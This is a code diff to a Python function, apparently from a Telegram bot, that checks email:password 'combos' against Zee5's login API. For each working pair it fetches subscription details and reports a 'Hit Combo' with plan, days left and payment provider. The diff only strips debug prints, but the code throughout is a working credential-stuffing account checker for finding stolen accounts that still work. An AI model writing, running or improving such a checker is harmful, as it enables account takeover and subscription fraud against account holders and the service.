@@ -14,8 +14,6 @@ def zee_helper(chat_id, combo):
         combo_split = combo.split(':')
         inpumail = combo_split[0]
         inpupass = combo_split[1]
-        print(inpumail)
-        print(inpupass)
     except IndexError:
         Editmessage(chat_id, 'Enter Valid Combo😡😡', status)
         return
@@ -26,14 +24,12 @@ def zee_helper(chat_id, combo):
     login_url = "https://userapi.zee5.com/v2/user/loginemail"
     result = session_requests.post(login_url, data=payload, headers=head)
     response = result.json()
-    # print(response)
     if result.status_code != 200:
         logger.info('Login Failed')
         code = response['code']
         msg = response['message']
         text = f'<b>Bad Combo ❌</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Error\nCode: {code}\nMessage: {msg}\nSite: Zee5</b>'
         Editmessage(chat_id, text, status)
-        print(text)
         return
     acess = response['access_token']
     head2 = {
@@ -47,11 +43,9 @@ def zee_helper(chat_id, combo):
     subs_url = 'https://subscriptionapi.zee5.com/v1/subscription?translation=en&country=IN&include_all=flase'
     response1 = session_requests.get(subs_url, headers=head2)
     result1 = response1.json()
-    # print(result1)
     if result1 == []:
         expire_text = f'<b>Expired Combo ❌</b>\n<b>Site: Voot</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Expired</b>'
         Editmessage(chat_id, expire_text, status)
-        print(expire_text)
         return
     timedioint = result1[0]["subscription_end"].split('T')[0]
     sub2split = timedioint.split('-')
@@ -61,4 +55,3 @@ def zee_helper(chat_id, combo):
     Pack_pyed = result1[0]['payment_provider']
     pro_message = f'<b>🌟 Hit Combo 💫</b>\n<b>Site: Zee5</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Premium\nPlan: {Pack_name}\nDays Left: {trial.days} Days\nPayment: {Pack_pyed}\nRecurring: {Pack_recur}</b>'
     Editmessage(chat_id, pro_message, status)
-    # print(pro_message)
